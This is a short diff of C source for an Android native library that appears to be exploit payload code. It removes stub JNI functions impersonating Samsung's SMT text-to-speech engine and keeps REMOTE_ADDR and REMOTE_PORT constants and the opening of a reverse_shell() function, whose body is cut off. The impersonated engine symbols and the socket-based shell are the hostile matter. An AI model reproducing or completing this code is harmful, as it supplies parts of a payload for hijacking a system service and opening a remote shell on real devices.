@@ -2,7 +2,6 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <string.h>
-#include <jni.h>
 #include <sys/wait.h>
 #include <arpa/inet.h>
 #include <android/log.h>
@@ -12,20 +11,6 @@
 
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 9999
-
-JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize(JNIEnv* env, jobject thiz) {
-    return -1;
-}
-
-JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_setLanguage(
-        JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
-    return 1;
-}
-
-JNIEXPORT jint Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(
-        JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
-    return -1;
-}
 
 static void reverse_shell() {
     struct sockaddr_in sa;
